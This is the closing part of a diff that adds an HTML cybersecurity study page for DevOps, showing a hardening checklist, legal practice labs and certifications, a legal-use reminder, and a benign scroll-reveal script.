+        <li>Docker containers run as non-root</li>
+        <li>K8s NetworkPolicies defined</li>
+        <li>K8s RBAC least-privilege configured</li>
+        <li>Cloud audit logging (CloudTrail) enabled</li>
+        <li>S3 buckets NOT public (verified)</li>
+        <li>MFA on all cloud & GitHub accounts</li>
+        <li>Incident response runbook documented</li>
+        <li>Security training done — 0 secrets in git history</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="bigcard reveal" style="margin-top:1.5rem;border-color:rgba(255,204,0,0.2);">
+    <div class="bigcard-title" style="color:var(--yellow)">🎓 Practice Labs — Where to Practice LEGALLY</div>
+    <div class="grid-3" style="margin-top:1rem;">
+      <div>
+        <div style="font-family:'Orbitron',monospace;font-size:0.65rem;color:var(--yellow);margin-bottom:0.5rem;">FREE PLATFORMS</div>
+        <ul class="cl y">
+          <li><strong>TryHackMe</strong> (tryhackme.com) — Best for beginners, guided paths</li>
+          <li><strong>HackTheBox</strong> (hackthebox.com) — Intermediate CTF machines</li>
+          <li><strong>PicoCTF</strong> — Absolute beginner friendly</li>
+          <li><strong>DVWA</strong> (Damn Vulnerable Web App) — Run locally</li>
+        </ul>
+      </div>
+      <div>
+        <div style="font-family:'Orbitron',monospace;font-size:0.65rem;color:var(--cyan);margin-bottom:0.5rem;">LOCAL LABS</div>
+        <ul class="cl c">
+          <li><strong>Metasploitable 2/3</strong> — Intentionally vulnerable VM</li>
+          <li><strong>VulnHub</strong> — Download vulnerable VMs to attack</li>
+          <li><strong>Kali Linux</strong> — All tools pre-installed, run in VM</li>
+          <li><strong>Docker DVWA</strong> — docker run vulnerables/dvwa</li>
+        </ul>
+      </div>
+      <div>
+        <div style="font-family:'Orbitron',monospace;font-size:0.65rem;color:var(--green);margin-bottom:0.5rem;">CERTIFICATIONS PATH</div>
+        <ul class="cl">
+          <li><strong>CompTIA Security+</strong> — Entry level, vendor-neutral</li>
+          <li><strong>eJPT</strong> (eLearnSecurity) — Practical, beginner hacking</li>
+          <li><strong>CEH</strong> — Certified Ethical Hacker</li>
+          <li><strong>OSCP</strong> — Gold standard for pentesters</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="banner red reveal" style="margin-top:1.5rem;">
+    <div class="banner-icon">⚖️</div>
+    <div>
+      <div class="banner-title">Legal & Ethical Reminder</div>
+      <div class="banner-text">Every tool in this guide can be used legally (on systems you own or have permission to test) or illegally (on others without permission). The Computer Fraud and Abuse Act (CFAA) and similar laws globally make unauthorized computer access a criminal offense with serious penalties. Always: own the system, have written permission, or use designated practice platforms. Use your skills for defense and authorized testing only.</div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  ◈ CYBERSECURITY FOR DEVOPS — 27 PAGE DEEP CANVAS &nbsp;·&nbsp; ALL 40+ TOOLS COVERED &nbsp;·&nbsp; FOR EDUCATIONAL PURPOSES ONLY &nbsp;·&nbsp; 2026
+</footer>
+
+<script>
+// Scroll reveal
+const els = document.querySelectorAll('.reveal');
+const obs = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      e.target.classList.add('visible');
+      obs.unobserve(e.target);
+    }
+  });
+}, { threshold: 0.06 });
+els.forEach(el => obs.observe(el));
+
+// Active nav
+const sections = document.querySelectorAll('section[id], .page[id]');
+const pills = document.querySelectorAll('.npill');
+const sObs = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      pills.forEach(p => p.classList.remove('active'));
+      const a = document.querySelector(`.npill[href="#${e.target.id}"]`);
+      if (a) {
+        a.classList.add('active');
+        a.scrollIntoView({behavior:'smooth', block:'nearest', inline:'center'});
+      }
+    }
+  });
+}, { threshold: 0.3 });
+sections.forEach(s => sObs.observe(s));
+</script>
+</body>
+</html>
